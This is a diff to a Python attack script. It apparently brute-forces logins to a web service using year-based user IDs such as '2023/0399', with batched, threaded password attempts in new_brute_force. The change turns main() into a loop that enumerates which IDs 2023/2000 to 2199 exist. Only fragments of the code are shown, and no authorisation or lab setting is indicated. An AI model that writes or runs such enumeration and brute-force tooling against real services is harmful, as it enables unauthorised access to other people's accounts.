@@ -4,8 +4,9 @@ from script.http_scripts import *
 import logging
 import time
 
-logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-log = logging.getLogger('test')
+# logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+# log = logging.getLogger('test')
+#
 #
 
 
@@ -46,7 +47,6 @@ def new_attempt_login(username, password, session):
 
 
 def new_brute_force(user_id: str, start_from: int, batch_size: int = 100, threads: int = 10):
-
     session = requests.Session()
 
     p = start_from
@@ -73,12 +73,10 @@ def new_brute_force(user_id: str, start_from: int, batch_size: int = 100, thread
 
 
 def main():
-    start_time = time.perf_counter()
-    new_brute_force("2023/0399", 9800)
-    end_time = time.perf_counter()
-    elapsedTime = str(end_time - start_time)[:8]
+    for i in range(2000, 2200):
+        formatted = '{0:04}'.format(i)
+        userid = "2023/" + formatted
+        existence = checkUserExistence(userid)
+        print(f"Checking for user: {userid}: "+str(existence))
 
-    print(elapsedTime)
 
-
-main()
